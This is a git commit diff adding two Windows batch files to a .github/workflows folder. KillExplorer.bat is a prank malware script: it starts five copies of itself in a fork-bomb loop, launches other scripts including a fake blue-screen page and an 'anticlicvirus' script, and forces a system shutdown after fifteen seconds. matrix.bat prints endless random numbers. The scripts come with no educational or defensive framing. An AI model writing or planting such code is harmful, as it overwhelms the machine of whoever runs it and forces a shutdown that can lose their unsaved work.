4c3fc77b94447684e81ff8d8a1ac66883f4540bd
Vava62600 <120785753+Vava62600@users.noreply.github.com>
2022-12-19 11:41:40 +0100

    Add files via upload

---
+++ .github/workflows/KillExplorer.bat
@@ -0,0 +1,31 @@
+@ echo off 
+
+CLS
+
+SLEEP 5
+
+start KillExplorer.bat
+
+start KillExplorer.bat
+
+start KillExplorer.bat
+
+start KillExplorer.bat
+
+start KillExplorer.bat
+
+
+
+start beep.bat
+
+start matrix.bat
+
+start anticlicvirus.bat
+
+SLEEP 50
+
+start bsod.hta
+
+shutdown /s /t 15
+
+start cmd.exe
---
+++ .github/workflows/matrix.bat
@@ -0,0 +1,6 @@
+@echo off
+color 0A
+:matrix
+title The Matrix %random% %random% %random% %random% %random% %random% %random% %random% %random%
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+goto matrix
